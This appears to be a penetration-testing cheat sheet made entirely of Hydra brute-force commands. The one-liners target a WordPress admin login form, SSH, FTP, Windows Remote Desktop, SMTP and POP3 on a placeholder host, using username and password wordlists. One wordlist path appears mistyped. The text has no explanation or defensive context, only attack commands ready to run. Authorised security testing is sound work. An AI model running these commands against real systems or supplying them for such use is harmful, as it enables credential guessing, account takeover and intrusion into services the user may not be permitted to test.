				brute force a Wordpress admin login
hydra -l admin -P passwords.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'

				SSH using list of users and passwords
hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh

				FTP known user and rockyou password list
hydra -t 1 -l admin -P passwords.txt -vV $ip ftp

				attack Windows Remote Desktop
hydra -t 1 -V -f -l administrator -P passwords.txt rdp://$ip

				SMTP Brute Force
hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V

				POP3 Brute Force
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V